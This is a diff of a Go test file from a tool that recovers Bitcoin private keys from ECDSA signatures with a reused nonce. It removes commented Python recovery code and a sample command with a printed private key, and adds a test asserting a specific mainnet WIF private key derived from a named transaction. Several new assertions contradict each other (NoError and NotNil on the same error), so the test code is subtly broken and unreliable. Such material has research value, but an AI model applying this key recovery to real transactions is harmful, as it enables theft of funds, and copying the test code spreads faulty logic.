@@ -2,68 +2,14 @@ package internal
 
 import (
 	"encoding/hex"
-	"github.com/btcsuite/btcd/btcec"
+	"github.com/btcsuite/btcd/chaincfg"
+	"github.com/btcsuite/btcutil"
 	"github.com/canselcik/nonced/internal/decoder"
 	"github.com/canselcik/nonced/internal/provider"
-	"log"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
 )
-
-//236   │     def recover_nonce_reuse(self, other):
-//237   │         sig2 = other.sig  # rename it
-//238   │         h2 = other.h  # rename it
-//239   │         # precalculate static values
-//240   │         z = self.h - h2
-//241   │         r_inv = inverse_mod(self.sig.r, self.n)
-//242   │         #
-//243   │         # tryqqqq all candidates
-//244   │         #
-//245   │         for candidate in (self.sig.s - sig2.s,
-//246   │                           self.sig.s + sig2.s,
-//247   │                           -self.sig.s - sig2.s,
-//248   │                           -self.sig.s + sig2.s):
-//249   │             k = (z * inverse_mod(candidate, self.n)) % self.n
-//250   │             d = (((self.sig.s * k - self.h) % self.n) * r_inv) % self.n
-//251   │             signingkey = SigningKey.from_secret_exponent(d, curve=self.curve)
-//252   │             if signingkey.get_verifying_key().pubkey.verifies(self.h, self.sig):
-//253   │                 self.signingkey = signingkey
-//254   │                 self.k = k
-//255   │                 self.x = d
-//256   │                 return self
-//257   │         assert False # could not recover private key
-
-// private key = (z1*s2 - z2*s1)/(r*(s1-s2))
-func RecoverNonceReuse(a, b *decoder.SigHashPair) bool {
-	if a == nil || b == nil || a == b {
-		return false
-	}
-	aPk, err := btcec.ParsePubKey(a.PublicKey, btcec.S256())
-	if err != nil {
-		log.Println("Error parsing first pubkey:", err.Error())
-		return false
-	}
-	bPk, err := btcec.ParsePubKey(b.PublicKey, btcec.S256())
-	if err != nil {
-		log.Println("Error parsing second pubkey:", err.Error())
-		return false
-	}
-
-	if !aPk.IsEqual(bPk) {
-		log.Println("SigHashPair w/ different public keys are not candidates for RecoverNonceReuse")
-		return false
-	}
-
-	// TODO: Port our impl to go from python (see reuse.py)
-	//./reuse.py 04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1 \
-	//c0e2d0a89a348de88fda08211c70d1d7e52ccef2eb9459911bf977d587784c6e 44e1ff2dfd8102cf7a47c21d5c9fd5701610d04953c6836596b4fe9dd2f53e3e \
-	//17b0f41c8c337ac1e18c98759e83a8cccbc368dd9d89e5f03cb633c265fd0ddc 9a5f1c75e461d7ceb1cf3cab9013eb2dc85b6d0da8c3c6e27e3a5a5b3faa5bab
-	//privkey:
-	//88865298299719117682218467295833367085649033095698151055007620974294165995414
-
-	return true
-}
 
 var _vulnTxnId = "9ec4bc49e828d924af1d1029cacf709431abbde46d59554b62bc270e3b29c4b1"
 var _vulnTxn, _ = hex.DecodeString("0100000002f64c603e2f9f4daf70c2f4252b2dcdb07" +
@@ -110,8 +56,10 @@ func TestNewAPI(t *testing.T) {
 	pubkey := "04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae13301" +
 		"6a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff"
 	for i, entry := range info {
-		assert.Equal(t, pubkey, hex.EncodeToString(entry.PublicKey), "failed to extract public key")
-		assert.Equal(t, r, hex.EncodeToString(entry.R.Bytes()), "failed to extract r")
+		assert.Equal(t, pubkey,
+			hex.EncodeToString(entry.PublicKey), "failed to extract public key")
+		assert.Equal(t, r,
+			hex.EncodeToString(entry.R.Bytes()), "failed to extract r")
 
 		switch i {
 		case 0:
@@ -127,5 +75,12 @@ func TestNewAPI(t *testing.T) {
 		}
 	}
 
-	RecoverNonceReuse(info[0], info[1])
+	privKey, err := info[0].RecoverPrivateKey(info[1])
+	assert.NoError(t, err, "failed to derive privateKey in a nonce-reuse scenario")
+	assert.NotNil(t, err, "derived privateKey is nil despite no errors")
+
+	asWif, err := btcutil.NewWIF(privKey, &chaincfg.MainNetParams, true)
+	assert.NotNil(t, err, "derived privateKey couldn't be encoded as WIF")
+	assert.Equal(t, "5KJp7KEffR7HHFWSFYjiCUAntRSTY69LAQEX1AUzaSBHHFdKEpQ",
+		asWif.String(),"derived wrong private key")
 }
